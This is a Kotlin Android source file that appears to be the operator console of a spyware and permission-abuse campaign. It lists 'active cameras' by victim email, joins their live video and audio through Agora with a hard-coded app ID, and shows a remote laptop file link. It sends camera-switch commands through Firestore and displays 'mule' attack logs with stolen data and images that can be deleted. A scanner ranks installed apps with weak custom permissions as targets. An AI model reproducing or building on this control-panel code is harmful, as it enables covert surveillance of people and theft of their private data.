package com.example.monitor

import android.Manifest
import android.content.pm.PackageManager
import android.content.pm.PermissionInfo
import android.graphics.BitmapFactory
import android.os.Build
import android.os.Bundle
import android.util.Base64
import android.view.SurfaceView
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.viewinterop.AndroidView
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.Query
import io.agora.rtc2.Constants
import io.agora.rtc2.IRtcEngineEventHandler
import io.agora.rtc2.RtcEngine
import io.agora.rtc2.video.VideoCanvas

const val AGORA_APP_ID = "40b0b12b81794659ac17a9a66fab985a"

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            MaterialTheme(
                colorScheme = darkColorScheme(
                    primary = Color(0xFFBB86FC),
                    secondary = Color(0xFF03DAC5),
                    background = Color(0xFF121212),
                    surface = Color(0xFF1E1E1E),
                    onPrimary = Color.Black,
                    onSecondary = Color.Black,
                    onBackground = Color.White,
                    onSurface = Color.White,
                    errorContainer = Color(0xFFCF6679),
                    onErrorContainer = Color.Black
                )
            ) {
                Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
                    PermissionHandler {
                        MonitorAppNav()
                    }
                }
            }
        }
    }
}

// --- PERMISSION HANDLER ---
@Composable
fun PermissionHandler(content: @Composable () -> Unit) {
    val launcher = rememberLauncherForActivityResult(contract = ActivityResultContracts.RequestMultiplePermissions()) { }
    LaunchedEffect(Unit) {
        val permissions = mutableListOf(Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO)
        if (Build.VERSION.SDK_INT >= 33) permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        launcher.launch(permissions.toTypedArray())
    }
    content()
}

// --- NAVIGATION ---
@Composable
fun MonitorAppNav() {
    var currentScreen by remember { mutableStateOf("home") }
    var selectedChannelName by remember { mutableStateOf("") }

    when (currentScreen) {
        "home" -> HomeScreen(
            onGoToMonitor = { currentScreen = "camera_list" },
            onGoToScanner = { currentScreen = "scanner" },
            onGoToMuleLogs = { currentScreen = "mule_logs" }
        )
        "camera_list" -> ActiveUserListScreen(
            onUserSelected = { channel -> selectedChannelName = channel; currentScreen = "video" },
            onBack = { currentScreen = "home" }
        )
        "video" -> LiveStreamViewer(
            channelName = selectedChannelName,
            onBack = { currentScreen = "camera_list" }
        )
        "scanner" -> PermissionLaunderingScanner(onBack = { currentScreen = "home" })
        "mule_logs" -> MuleLogsScreen(onBack = { currentScreen = "home" })
    }
}

// --- HOME SCREEN ---
@Composable
fun HomeScreen(onGoToMonitor: () -> Unit, onGoToScanner: () -> Unit, onGoToMuleLogs: () -> Unit) {
    Column(modifier = Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.Center, horizontalAlignment = Alignment.CenterHorizontally) {
        Text("Monitor Tools", style = MaterialTheme.typography.headlineLarge, fontWeight = FontWeight.Bold); Spacer(modifier = Modifier.height(32.dp))
        Button(onClick = onGoToMonitor, modifier = Modifier.fillMaxWidth().height(70.dp), shape = RoundedCornerShape(12.dp)) { Icon(Icons.Default.Videocam, null); Spacer(Modifier.width(16.dp)); Text("Live Camera Monitor") }
        Spacer(Modifier.height(16.dp))
        Button(onClick = onGoToScanner, modifier = Modifier.fillMaxWidth().height(70.dp), shape = RoundedCornerShape(12.dp), colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.tertiary)) { Icon(Icons.Default.Security, null); Spacer(Modifier.width(16.dp)); Text("App Permission Scanner") }
        Spacer(Modifier.height(16.dp))
        Button(onClick = onGoToMuleLogs, modifier = Modifier.fillMaxWidth().height(70.dp), shape = RoundedCornerShape(12.dp), colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.errorContainer)) { Icon(Icons.Default.BugReport, null); Spacer(Modifier.width(16.dp)); Text("Mule Attack Logs") }
    }
}

// --- NEW: MULE LOGS SCREEN (WITH IMAGE & DELETE) ---
// Model for Log to hold ID (for deletion) and Data
data class MuleLog(val id: String, val data: Map<String, Any>)

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun MuleLogsScreen(onBack: () -> Unit) {
    val db = FirebaseFirestore.getInstance()
    var logs by remember { mutableStateOf<List<MuleLog>>(emptyList()) }

    // Fetch logs including Document ID
    LaunchedEffect(Unit) {
        db.collection("mule_logs").orderBy("timestamp", Query.Direction.DESCENDING)
            .addSnapshotListener { snapshot, _ ->
                if (snapshot != null) {
                    logs = snapshot.documents.map { MuleLog(it.id, it.data ?: emptyMap()) }
                }
            }
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("Mule Access Logs") },
                navigationIcon = { IconButton(onClick = onBack) { Icon(Icons.Default.ArrowBack, "Back") } }
            )
        }
    ) { padding ->
        LazyColumn(modifier = Modifier.padding(padding).padding(16.dp)) {
            if (logs.isEmpty()) {
                item { Text("No attack logs found...", color = Color.Gray) }
            }
            items(logs) { log ->
                MuleLogCard(
                    log = log,
                    onDelete = {
                        // DELETE ACTION
                        db.collection("mule_logs").document(log.id).delete()
                    }
                )
            }
        }
    }
}

@Composable
fun MuleLogCard(log: MuleLog, onDelete: () -> Unit) {
    val data = log.data
    Card(
        modifier = Modifier.fillMaxWidth().padding(bottom = 12.dp),
        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            // Header Row: User and Delete Button
            Row(
                modifier = Modifier.fillMaxWidth(),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Default.Person, null, tint = MaterialTheme.colorScheme.primary)
                    Spacer(Modifier.width(8.dp))
                    Text(
                        text = "${data["user"]}",
                        style = MaterialTheme.typography.titleMedium,
                        fontWeight = FontWeight.Bold
                    )
                }
                // DELETE BUTTON
                IconButton(onClick = onDelete) {
                    Icon(Icons.Default.Delete, "Delete Log", tint = Color.Red)
                }
            }

            Divider(modifier = Modifier.padding(vertical = 8.dp), color = Color.Gray.copy(alpha=0.3f))

            Text("CP Accessed:", fontSize = 12.sp, color = Color.Gray)
            Text(text = "${data["cp_accessed"]}", style = MaterialTheme.typography.bodyMedium, color = MaterialTheme.colorScheme.error, fontWeight = FontWeight.Bold)

            Spacer(Modifier.height(8.dp))
            Text("Data Accessed:", fontSize = 12.sp, color = Color.Gray)
            Text(text = "${data["data_accessed"]}", style = MaterialTheme.typography.bodyMedium)

            // --- IMAGE DISPLAY ---
            val base64Image = data["image_base64"] as? String
            if (!base64Image.isNullOrEmpty()) {
                Spacer(modifier = Modifier.height(12.dp))
                Text("Stolen Image Preview:", fontSize = 12.sp, color = Color.Yellow)

                // Decode Base64 to Bitmap
                val bitmap = remember(base64Image) {
                    try {
                        val decodedBytes = Base64.decode(base64Image, Base64.DEFAULT)
                        BitmapFactory.decodeByteArray(decodedBytes, 0, decodedBytes.size)
                    } catch (e: Exception) { null }
                }

                if (bitmap != null) {
                    Image(
                        bitmap = bitmap.asImageBitmap(),
                        contentDescription = "Stolen Image",
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(200.dp)
                            .padding(top = 8.dp)
                            .clip(RoundedCornerShape(8.dp))
                            .background(Color.Black)
                    )
                }
            }

            Spacer(Modifier.height(8.dp))
            Text(text = "${data["timestamp"]}", style = MaterialTheme.typography.labelSmall, modifier = Modifier.align(Alignment.End))
        }
    }
}

// --- SCANNER (Keep Existing) ---
data class AppAnalysis(val appName: String, val packageName: String, val definedCustomPermissions: List<CustomPermission>)
data class CustomPermission(val name: String, val protectionLevel: String, val isRisk: Boolean)

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun PermissionLaunderingScanner(onBack: () -> Unit) {
    val context = LocalContext.current
    var appList by remember { mutableStateOf<List<AppAnalysis>>(emptyList()) }
    var isLoading by remember { mutableStateOf(true) }

    LaunchedEffect(Unit) {
        val pm = context.packageManager
        try {
            val installedPackages = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                pm.getInstalledPackages(PackageManager.PackageInfoFlags.of(PackageManager.GET_PERMISSIONS.toLong()))
            } else {
                @Suppress("DEPRECATION")
                pm.getInstalledPackages(PackageManager.GET_PERMISSIONS)
            }

            val analyzedApps = installedPackages.mapNotNull { packInfo ->
                val appName = packInfo.applicationInfo.loadLabel(pm).toString()
                val packageName = packInfo.packageName
                val definedPerms = packInfo.permissions?.mapNotNull { permInfo ->
                    if (permInfo.name.startsWith("android.permission")) return@mapNotNull null
                    val protLevelInt = permInfo.protectionLevel and PermissionInfo.PROTECTION_MASK_BASE
                    val isRisk = (protLevelInt == PermissionInfo.PROTECTION_NORMAL)
                    CustomPermission(permInfo.name, if(isRisk) "Normal (RISK)" else "Safe", isRisk)
                } ?: emptyList()
                if (definedPerms.isNotEmpty()) AppAnalysis(appName, packageName, definedPerms) else null
            }.sortedByDescending { it.definedCustomPermissions.count { p -> p.isRisk } }
            appList = analyzedApps
        } catch (e: Exception) { e.printStackTrace() } finally { isLoading = false }
    }

    Scaffold(topBar = { TopAppBar(title = { Text("App Scanner") }, navigationIcon = { IconButton(onClick = onBack) { Icon(Icons.Default.ArrowBack, "Back") } }) }) { padding ->
        if (isLoading) Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) { CircularProgressIndicator() }
        else LazyColumn(Modifier.padding(padding).padding(16.dp)) {
            if (appList.isEmpty()) item { Text("No apps with custom permissions found.") }
            items(appList) { app ->
                Card(Modifier.fillMaxWidth().padding(bottom = 8.dp), colors = CardDefaults.cardColors(containerColor = if(app.definedCustomPermissions.any { it.isRisk }) Color(0xFF3E2723) else MaterialTheme.colorScheme.surfaceVariant)) {
                    Column(Modifier.padding(16.dp)) {
                        Text(app.appName, fontWeight = FontWeight.Bold)
                        Text(app.packageName, style = MaterialTheme.typography.bodySmall, color = Color.Gray)
                        Spacer(Modifier.height(8.dp))
                        app.definedCustomPermissions.forEach { perm ->
                            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                                Text("• ${perm.name.substringAfterLast(".")}", fontSize = 12.sp, modifier = Modifier.weight(1f))
                                Text(perm.protectionLevel, fontSize = 12.sp, color = if(perm.isRisk) Color.Red else Color.Green)
                            }
                        }
                    }
                }
            }
        }
    }
}

// --- ACTIVE CAMERA LIST ---
@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun ActiveUserListScreen(onUserSelected: (String) -> Unit, onBack: () -> Unit) {
    val db = FirebaseFirestore.getInstance()
    var cameras by remember { mutableStateOf<List<Map<String, String>>>(emptyList()) }
    LaunchedEffect(Unit) {
        db.collection("active_cameras").addSnapshotListener { snapshot, _ ->
            if (snapshot != null) {
                cameras = snapshot.documents.map { doc -> mapOf("email" to (doc.getString("email") ?: "Unknown"), "channel" to doc.id) }
            }
        }
    }
    Scaffold(topBar = { TopAppBar(title = { Text("Active Cameras") }, navigationIcon = { IconButton(onClick = onBack) { Icon(Icons.Default.ArrowBack, "Back") } }) }) { padding ->
        Column(Modifier.padding(padding).padding(16.dp)) {
            if (cameras.isEmpty()) Text("No active cameras found...", color = Color.Gray)
            LazyColumn {
                items(cameras) { cam ->
                    Card(Modifier.fillMaxWidth().padding(bottom = 8.dp).clickable { onUserSelected(cam["channel"]!!) }, colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)) {
                        Row(Modifier.padding(16.dp), verticalAlignment = Alignment.CenterVertically) {
                            Icon(Icons.Default.PlayArrow, null); Spacer(Modifier.width(16.dp))
                            Column { Text(cam["email"] ?: "Camera", style = MaterialTheme.typography.titleSmall); Text("Tap to view live feed", style = MaterialTheme.typography.bodySmall) }
                        }
                    }
                }
            }
        }
    }
}

// --- LIVE VIEWER ---
@Composable
fun LiveStreamViewer(channelName: String, onBack: () -> Unit) {
    val context = LocalContext.current
    var rtcEngine by remember { mutableStateOf<RtcEngine?>(null) }
    val db = FirebaseFirestore.getInstance()
    var fileServerUrl by remember { mutableStateOf("Fetching IP...") }
    val remoteSurfaceView = remember { SurfaceView(context).apply { setZOrderMediaOverlay(true) } }

    LaunchedEffect(channelName) {
        db.collection("active_cameras").document(channelName).addSnapshotListener { snapshot, _ ->
            if (snapshot != null && snapshot.exists()) fileServerUrl = snapshot.getString("file_url") ?: "No Access"
        }
    }

    DisposableEffect(channelName) {
        val engine = RtcEngine.create(context, AGORA_APP_ID, object : IRtcEngineEventHandler() {
            override fun onUserJoined(uid: Int, elapsed: Int) {
                (context as? ComponentActivity)?.runOnUiThread {
                    val videoCanvas = VideoCanvas(remoteSurfaceView, VideoCanvas.RENDER_MODE_HIDDEN, uid)
                    rtcEngine?.setupRemoteVideo(videoCanvas)
                }
            }
        })
        engine.setChannelProfile(Constants.CHANNEL_PROFILE_LIVE_BROADCASTING); engine.setClientRole(Constants.CLIENT_ROLE_AUDIENCE); engine.enableVideo(); engine.enableAudio(); engine.joinChannel(null, channelName, null, 0); rtcEngine = engine
        onDispose { rtcEngine?.leaveChannel(); RtcEngine.destroy(); rtcEngine = null }
    }

    Box(Modifier.fillMaxSize().background(Color.Black)) {
        AndroidView(factory = { remoteSurfaceView }, modifier = Modifier.fillMaxSize())
        Column(Modifier.align(Alignment.TopCenter).fillMaxWidth().background(Color.Black.copy(alpha = 0.7f)).padding(top = 40.dp, bottom = 10.dp), horizontalAlignment = Alignment.CenterHorizontally) {
            Text("Laptop File Link:", color = Color.LightGray, fontSize = 12.sp)
            Text(text = fileServerUrl, color = Color.Green, fontSize = 20.sp, fontWeight = FontWeight.Bold)
        }
        IconButton(onClick = onBack, modifier = Modifier.align(Alignment.TopStart).padding(top = 40.dp, start = 16.dp)) { Icon(Icons.Default.ArrowBack, "Back", tint = Color.White) }
        IconButton(onClick = { db.collection("commands").document(channelName).set(mapOf("action" to "switch_camera")) }, modifier = Modifier.align(Alignment.TopEnd).padding(top = 40.dp, end = 16.dp)) { Icon(Icons.Default.Refresh, "Switch Camera", tint = Color.White) }
    }
}